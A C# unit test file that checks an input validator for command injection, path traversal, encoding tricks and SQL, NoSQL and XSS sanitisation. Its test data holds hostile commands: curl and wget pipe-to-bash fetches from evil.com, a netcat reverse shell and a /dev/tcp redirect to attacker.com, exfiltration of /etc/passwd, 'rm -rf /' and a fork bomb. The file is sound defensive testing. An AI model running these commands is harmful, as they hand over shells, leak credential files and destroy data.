using Microsoft.Extensions.Logging;
using Moq;
using WAiSA.API.Security.Validation;
using WAiSA.API.Security.Validation.Models;
using Xunit;

namespace WAiSA.API.Tests.Security.Validation;

/// <summary>
/// Advanced test scenarios for InputValidator including edge cases and complex attacks
/// </summary>
public class InputValidatorAdvancedTests
{
    private readonly Mock<ILogger<InputValidator>> _mockLogger;
    private readonly InputValidator _validator;

    public InputValidatorAdvancedTests()
    {
        _mockLogger = new Mock<ILogger<InputValidator>>();
        _validator = new InputValidator(_mockLogger.Object);
    }

    #region Unicode and Encoding Tests

    [Fact]
    public void ValidateCommand_UnicodeNormalization_HandlesCorrectly()
    {
        // Arrange - Unicode composed vs decomposed characters
        var command1 = "café"; // NFC (composed)
        var command2 = "café"; // NFD (decomposed)

        // Act
        var result1 = _validator.ValidateCommand(command1);
        var result2 = _validator.ValidateCommand(command2);

        // Assert
        Assert.True(result1.IsValid);
        Assert.True(result2.IsValid);
    }

    [Theory]
    [InlineData("test\\x2frm\\x20-rf")]  // Hex encoded: /rm -rf
    [InlineData("test%2Frm%20-rf")]      // URL encoded: /rm -rf
    [InlineData("test&#47;rm&#32;-rf")]  // HTML entity encoded
    public void CheckForInjectionPatterns_EncodedCommands_Detected(string encodedCommand)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(encodedCommand);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.EncodingAttempt);
    }

    [Fact]
    public void CheckForInjectionPatterns_Base64EncodedMalicious_Detected()
    {
        // Arrange - "rm -rf /" in base64
        var base64Evil = "cm0gLXJmIC8=";

        // Act
        var result = _validator.CheckForInjectionPatterns(base64Evil);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f =>
            f.Type == ValidationFailureType.EncodingAttempt &&
            f.Message.Contains("Base64"));
    }

    #endregion

    #region Complex Injection Patterns

    [Theory]
    [InlineData("normal;sleep 10;whoami")]
    [InlineData("test && curl http://evil.com/script.sh | bash")]
    [InlineData("$(wget -qO- evil.com/payload)")]
    [InlineData("`nc -e /bin/sh attacker.com 1234`")]
    [InlineData("test || cat /etc/passwd | curl -F data=@- http://evil.com")]
    public void CheckForInjectionPatterns_ComplexChainedAttacks_Detected(string attack)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(attack);

        // Assert
        Assert.False(result.IsValid);
        Assert.Equal(ValidationSeverity.Critical, result.Severity);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Theory]
    [InlineData("> /dev/tcp/attacker.com/1234")]
    [InlineData(">> /var/log/system.log")]
    [InlineData("< /etc/shadow")]
    public void CheckForInjectionPatterns_RedirectionAttacks_Detected(string redirect)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(redirect);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Theory]
    [InlineData("${PATH}")]
    [InlineData("$HOME/.bashrc")]
    [InlineData("${IFS}")]
    public void CheckForInjectionPatterns_EnvironmentVariables_Detected(string envVar)
    {
        // Act
        var result = _validator.CheckForInjectionPatterns(envVar);

        // Assert
        Assert.False(result.IsValid);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
    }

    [Fact]
    public void CheckForInjectionPatterns_ForkBomb_Detected()
    {
        // Arrange
        var forkBomb = ":(){ :|:& };:";

        // Act
        var result = _validator.CheckForInjectionPatterns(forkBomb);

        // Assert
        Assert.False(result.IsValid);
        Assert.Equal(ValidationSeverity.Critical, result.Severity);
    }

    #endregion

    #region Path Traversal Advanced Tests

    [Theory]
    [InlineData("..%2F..%2F..%2Fetc%2Fpasswd")]  // URL encoded
    [InlineData("..\\..\\..\\windows\\system32\\config\\sam")]  // Windows
    [InlineData("....//....//....//etc//passwd")]  // Double encoding
    [InlineData(".././.././.././etc/passwd")]  // Interleaved
    public void CheckForPathTraversal_EncodedAndObfuscated_Detected(string path)
    {
        // Arrange
        var parameters = new Dictionary<string, string> { { "path", path } };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
    }

    [Theory]
    [InlineData("/proc/self/environ")]
    [InlineData("/dev/null")]
    [InlineData("/sys/class/net")]
    public void CheckForPathTraversal_SystemPaths_Detected(string systemPath)
    {
        // Arrange
        var parameters = new Dictionary<string, string> { { "file", systemPath } };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
        Assert.Contains(violations, v => v.Type == PathTraversalType.AbsolutePath);
    }

    [Theory]
    [InlineData("\\\\?\\C:\\Windows\\System32")]  // Extended-length path
    [InlineData("\\\\localhost\\C$\\")]  // Admin share
    [InlineData("\\\\192.168.1.1\\share")]  // Network UNC
    public void CheckForPathTraversal_WindowsAdvancedPaths_Detected(string windowsPath)
    {
        // Arrange
        var parameters = new Dictionary<string, string> { { "path", windowsPath } };

        // Act
        var violations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.NotEmpty(violations);
    }

    #endregion

    #region Parameter Sanitization Advanced Tests

    [Fact]
    public void SanitizeParameters_SQLInjectionAttempts_Sanitized()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "username", "admin' OR '1'='1" },
            { "password", "' UNION SELECT * FROM users--" }
        };

        // Act
        var sanitized = _validator.SanitizeParameters(parameters);

        // Assert - Single quotes should be escaped
        Assert.DoesNotContain("'", sanitized["username"].Replace("\\'", ""));
    }

    [Fact]
    public void SanitizeParameters_NoSQLInjectionAttempts_Sanitized()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "query", "{$where: 'this.password == \"secret\"'}" },
            { "filter", "{ $gt: '' }" }
        };

        // Act
        var sanitized = _validator.SanitizeParameters(parameters);

        // Assert - Special characters removed
        Assert.DoesNotContain("$", sanitized["query"]);
        Assert.DoesNotContain("$", sanitized["filter"]);
    }

    [Fact]
    public void SanitizeParameters_XSSAttempts_Sanitized()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "comment", "<script>alert('XSS')</script>" },
            { "name", "<img src=x onerror=alert(1)>" }
        };

        // Act
        var sanitized = _validator.SanitizeParameters(parameters);

        // Assert - Dangerous characters removed
        Assert.DoesNotContain("<", sanitized["comment"]);
        Assert.DoesNotContain(">", sanitized["comment"]);
        Assert.DoesNotContain("<", sanitized["name"]);
        Assert.DoesNotContain(">", sanitized["name"]);
    }

    [Fact]
    public void SanitizeParameters_ControlCharacters_Removed()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "data", "test\r\nvalue\0with\nnewlines" }
        };

        // Act
        var sanitized = _validator.SanitizeParameters(parameters);

        // Assert
        Assert.DoesNotContain("\r", sanitized["data"]);
        Assert.DoesNotContain("\n", sanitized["data"]);
        Assert.DoesNotContain("\0", sanitized["data"]);
    }

    #endregion

    #region Edge Cases and Boundary Tests

    [Fact]
    public void ValidateCommand_ExactlyMaxLength_Passes()
    {
        // Arrange
        var command = new string('a', 10000);

        // Act
        var result = _validator.ValidateCommand(command);

        // Assert
        Assert.True(result.IsValid || result.Failures.All(f => f.Type != ValidationFailureType.LengthExceeded));
    }

    [Fact]
    public void ValidateCommand_ExactlyMaxParameterCount_Passes()
    {
        // Arrange
        var command = "test";
        var parameters = Enumerable.Range(1, 50)
            .ToDictionary(i => $"param{i}", i => $"value{i}");

        // Act
        var result = _validator.ValidateCommand(command, parameters);

        // Assert
        Assert.DoesNotContain(result.Failures, f =>
            f.Type == ValidationFailureType.LengthExceeded &&
            f.Message.Contains("Parameter count"));
    }

    [Fact]
    public void ValidateCommand_EmptyParameters_HandlesGracefully()
    {
        // Arrange
        var command = "test";
        var parameters = new Dictionary<string, string>();

        // Act
        var result = _validator.ValidateCommand(command, parameters);

        // Assert
        Assert.True(result.IsValid);
    }

    [Theory]
    [InlineData(null)]
    [InlineData("")]
    [InlineData("   ")]
    public void SanitizeParameters_NullEmptyWhitespaceValues_HandlesGracefully(string? value)
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "test", value! }
        };

        // Act
        var sanitized = _validator.SanitizeParameters(parameters);

        // Assert
        Assert.NotNull(sanitized);
        Assert.Contains("test", sanitized.Keys);
    }

    #endregion

    #region Multi-Vector Attack Tests

    [Fact]
    public void FullValidation_MultiVectorAttack_DetectsAll()
    {
        // Arrange - Combined attack: injection + path traversal + encoding
        var command = ";rm -rf / && curl $(echo aHR0cDovL2V2aWwuY29t | base64 -d)";
        var parameters = new Dictionary<string, string>
        {
            { "config", "../../etc/passwd" },
            { "output", "/dev/null" },
            { "script", "`whoami`" }
        };

        // Act
        var result = _validator.ValidateCommand(command, parameters);
        var pathViolations = _validator.CheckForPathTraversal(parameters);

        // Assert
        Assert.False(result.IsValid);
        Assert.Equal(ValidationSeverity.Critical, result.Severity);
        Assert.Contains(result.Failures, f => f.Type == ValidationFailureType.CommandInjection);
        Assert.NotEmpty(pathViolations);
    }

    [Fact]
    public void ValidateCommand_PolymorphicShellcode_Detected()
    {
        // Arrange - Various obfuscation techniques
        var attacks = new[]
        {
            "eval(String.fromCharCode(97,108,101,114,116))",  // JavaScript eval
            "exec(compile('import os', '', 'exec'))",  // Python exec
            "${''.join([chr(i) for i in [114,109]])}",  // Python obfuscation
        };

        // Act & Assert
        foreach (var attack in attacks)
        {
            var result = _validator.CheckForInjectionPatterns(attack);
            // Should detect suspicious patterns even if not exact matches
            Assert.True(!result.IsValid || result.Failures.Any(),
                $"Failed to detect obfuscated attack: {attack}");
        }
    }

    #endregion

    #region Performance and Stress Tests

    [Fact]
    public void ValidateCommand_LargeParameterSet_PerformsEfficiently()
    {
        // Arrange
        var command = "process data";
        var parameters = Enumerable.Range(1, 50)
            .ToDictionary(i => $"param_{i}", i => new string('x', 1000));

        // Act
        var startTime = DateTime.UtcNow;
        var result = _validator.ValidateCommand(command, parameters);
        var elapsed = DateTime.UtcNow - startTime;

        // Assert - Should complete in under 100ms
        Assert.True(elapsed.TotalMilliseconds < 100,
            $"Validation took {elapsed.TotalMilliseconds}ms, expected < 100ms");
    }

    [Fact]
    public void CheckForInjectionPatterns_RepeatedCalls_MaintainsPerformance()
    {
        // Arrange
        var command = "safe command with no issues";
        var iterations = 1000;

        // Act
        var startTime = DateTime.UtcNow;
        for (int i = 0; i < iterations; i++)
        {
            _validator.CheckForInjectionPatterns(command);
        }
        var elapsed = DateTime.UtcNow - startTime;

        // Assert - Should maintain sub-millisecond average
        var avgMs = elapsed.TotalMilliseconds / iterations;
        Assert.True(avgMs < 1.0,
            $"Average validation time {avgMs}ms, expected < 1ms");
    }

    #endregion

    #region Logging Verification Tests

    [Fact]
    public void ValidateCommand_CriticalViolation_LogsWarning()
    {
        // Arrange
        var command = ";rm -rf /";

        // Act
        _validator.ValidateCommand(command);

        // Assert
        _mockLogger.Verify(
            x => x.Log(
                LogLevel.Warning,
                It.IsAny<EventId>(),
                It.Is<It.IsAnyType>((v, t) => v.ToString()!.Contains("injection")),
                It.IsAny<Exception>(),
                It.IsAny<Func<It.IsAnyType, Exception?, string>>()),
            Times.AtLeastOnce);
    }

    [Fact]
    public void CheckForPathTraversal_ViolationsFound_LogsWarning()
    {
        // Arrange
        var parameters = new Dictionary<string, string>
        {
            { "path1", "../../etc/passwd" },
            { "path2", "/root/.ssh" }
        };

        // Act
        _validator.CheckForPathTraversal(parameters);

        // Assert
        _mockLogger.Verify(
            x => x.Log(
                LogLevel.Warning,
                It.IsAny<EventId>(),
                It.Is<It.IsAnyType>((v, t) => v.ToString()!.Contains("path traversal")),
                It.IsAny<Exception>(),
                It.IsAny<Func<It.IsAnyType, Exception?, string>>()),
            Times.Once);
    }

    #endregion
}
